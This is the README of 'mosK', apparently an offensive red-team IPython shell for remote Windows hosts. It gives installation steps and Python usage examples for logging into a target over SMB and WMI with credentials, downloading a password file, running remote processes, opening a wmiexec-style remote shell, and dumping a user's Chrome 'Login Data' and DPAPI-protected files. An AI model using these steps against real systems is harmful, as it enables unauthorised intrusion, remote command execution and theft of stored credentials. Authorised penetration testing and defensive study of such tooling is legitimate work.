# mosK 🦅
the red team `IPython` shell 🧑‍💻

## installation
```bash
# clone the repo
git clone https://github.com/idobarel/mosK.git && cd mosK
# install requirements
pip3 install -r requirements.txt
# run it using
python3 mosK
```
## why IPython?
It is just better. the fact you can run in a pythonic env allows you to: 
- run more complete logic on you products
- create automation and scripts
- develop more crazy stuff (without breaking you head)
- have it all in one


## usage
as it is for now, there are few utils the `mosK` provides:
### `Target` class:
the target object can be used to access remote computers `SMB` (for file manipulation) or `WMI` (for RCE or WQL).
the target class is easy to use and it is the base for all the other utils.
### `Chrome` class:
allows you to take a target and dump all the chrome `Login Data` files of a specific user.
### `DPAPI` class:
allows you to get all the dpapi protect files of a user, for `home-side` decryption of data.
### `ExecWMI` class:
gives you the features of `impackets wmiexec`!


## example usage
this should cover most of the usage, feel free the explorer throgh the shell!
```python
# target init
target = Target("test:test@192.168.1.13")

# login one by one
target.smb.login()
target.wmi.login()
# OR
# login both at once
target.login_all()


# shares or files manipulation (SMB must be logged in!)
target.smb.list_shares() # get a list of shares
target.smb.use_share("C$") # use the share `C$`
target.smb.list_path("\\Windows\\Temp\\") # to list the C:\Windows\Temp path
target.smb.download_file("\\Admin Folder\\password.txt") # save remote file to `password.txt`
# upload `lol.txt` to remote target
target.smb.upload_file("./lol.txt", "\\Users\\test\\Desktop\\lol.txt")

# RCE + WQL (WMI must be logged in!)
target.wmi.create_process("netstat.exe -an") # run netstat (no output)
target.wmi.query("select name,processid from Win32_Process") # get a tasklist using WQL


# executor (wmiexec)
wmiexec = ExecWMI(target)
wmiexec.shell() # start a shell
wmiexec.execute("whoami") # run a single command (with output)

# dpapi
dpapi = DPAPI(target)
dpapi.get_protect_files("test") # dump all the protect files of `test`

# chrome
chrome = Chrome(target)
chrome.dump("test") # dump all the chrome files of `test`


target # to see the running connections
target.clear() # close the connections
```

To exit the console and close all the connections, you can hit `CTRL+D` 🧮
